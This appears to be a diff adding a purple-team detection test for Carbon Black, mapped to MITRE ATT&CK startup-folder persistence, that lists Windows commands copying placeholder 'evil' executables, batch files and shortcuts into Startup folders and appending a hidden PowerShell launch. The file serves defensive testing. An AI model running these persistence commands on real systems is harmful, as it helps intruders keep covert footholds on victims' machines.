@@ -1,0 +1,31 @@
+enabled: true
+meta:
+  author: cg 
+  created: 2017-10-03
+  decorations:
+  - Purple Team
+  description: Dropping files in startup folders for persistence
+  link: https://attackerkb.com/OSX/persistence
+  mitre_link: https://attack.mitre.org/wiki/Technique/T1060
+  mitre_attack_phase: Persistence
+  mitre_attack_technique: Registry Run Keys / Start Folder
+  platform: carbonblack
+  priority: medium
+  purple_actions:
+    1: cmd.exe /c copy blah.exe C:\\Users\\automation\\AppData\\Roaming\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\blah.exe
+    2: cmd.exe /c copy evil.exe C:\\ProgramData\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\evil.exe
+    3: cmd.exe /c copy evil.bat C:\\Users\\automation\\AppData\\Roaming\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\evil.bat
+    4: cmd.exe /c copy evil.bat C:\\ProgramData\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\evil.bat
+    5: cmd.exe /c copy shady.lnk C:\\Users\\automation\\AppData\\Roaming\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.lnk
+    6: cmd.exe /c copy shady.lnk C:\\ProgramData\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.lnk
+    7: cmd.exe /c echo [InternetShortcut] > C:\\Users\\automation\\AppData\\Roaming\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.url
+    8: cmd.exe /c echo URL=file:///C:\\windows\\temp\evil.exe >> C:\\Users\\automation\\AppData\\Roaming\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.url
+    9: cmd.exe /c type C:\\Users\\automation\\AppData\\Roaming\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.url
+    10: cmd.exe /c echo [InternetShortcut] > C:\\ProgramData\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.url
+    11: cmd.exe /c echo URL=file:///C:\\windows\\temp\evil.exe >> C:\\ProgramData\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.url
+    12: cmd.exe /c type C:\\ProgramData\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.url
+    13: cmd.exe /c echo start /b powershell.exe -nop -w hidden -c Get-Host >> C:\\Users\\automation\\AppData\\Roaming\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.cmd
+    14: cmd.exe /c type C:\\Users\\automation\\AppData\\Roaming\\Microsoft\\Windows\\Startm~1\\Programs\\Startup\\shady.cmd
+os: windows
+name: Place various file types in startup for persistence
+uuid: 7680ca35-b620-410c-af9b-5190d418be48
